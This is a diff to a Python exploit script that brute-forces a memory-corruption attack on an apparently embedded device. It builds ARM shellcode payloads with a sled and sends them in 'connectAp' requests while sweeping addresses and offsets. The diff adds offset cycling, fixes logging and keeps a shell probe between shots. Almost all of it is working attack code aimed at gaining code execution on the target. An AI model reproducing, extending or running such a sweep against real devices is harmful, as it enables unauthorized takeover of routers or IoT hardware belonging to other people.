@@ -16,6 +16,8 @@ STEP = 0x400
 LOG = "/tmp/c460_incremental_sweep.log"
 STATE = "/tmp/c460_sweep_incremental.idx"
 OFFSET = int(os.environ.get("OFFSET", "1024"))
+OFFSET_STEP = int(os.environ.get("OFFSET_STEP", "64"))
+OFFSET_N = int(os.environ.get("OFFSET_N", "9"))
 SLED = int(os.environ.get("SLED", "512"))
 
 def log(m):
@@ -109,8 +111,9 @@ def try_sleep_off(sess, variants):
             code = r["result"]["responses"][0]["error_code"]
         except Exception:
             code = None
-        log(f"sleep-off {sm['method']} {sm['params']} -> {code if code is not None else str(r)[:60]}")
-        emit("sleep_off", {"method": sm["method"], "params": sm["params"], "code": code})
+        prm = sm.get("params")     # one shape carries none
+        log(f"sleep-off {sm['method']} {prm} -> {code if code is not None else str(r)[:60]}")
+        emit("sleep_off", {"method": sm["method"], "params": prm, "code": code})
         if code == 0:
             log("sleep-off accepted")
             emit("sleep_off", {"accepted": True, "method": sm["method"]})
@@ -141,16 +144,18 @@ def main():
             fired = 0
             while fired < 12:
                 addr = BASE + idx * STEP
+                o_idx = globals().setdefault("O_IDX", 0)
                 try:
                     # build/params shell out to arm-none-eabi-as and can raise SystemExit,
                     # which is not an Exception — keep them inside the guard as well
-                    b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False,
+                    off = OFFSET + (O_IDX % OFFSET_N) * OFFSET_STEP
+                    b64 = T.build(off, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False,
                                   sledfill=True, pcround=0x1000, hang=True)
                     body = {"method": "connectAp",
                             "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                     T.req(HOST, sess, body, timeout=8)
-                    log(f"{addr:#x} fired")
-                    emit("fire", {"addr": hex(addr), "idx": idx})
+                    log(f"{addr:#x} off {off} fired")
+                    emit("fire", {"addr": hex(addr), "idx": idx, "offset": off})
                 except BaseException as e:
                     log(f"{addr:#x} exc {type(e).__name__} {e}")
                 # cheap shell probe between shots
@@ -165,8 +170,11 @@ def main():
                     return
                 except Exception:
                     pass
+                # one offset per shot; the address only advances once every offset is spent
+                globals()["O_IDX"] = (O_IDX + 1) % OFFSET_N
+                if O_IDX == 0:
+                    idx += 1
                 with open(STATE, "w") as f: f.write(str(idx))
-                idx += 1
                 fired += 1
             # sleep-off last: it costs seconds, and the shots matter more than the reply
             # Ask for sleep-off WITH the session. The shell script posts all methods blind to
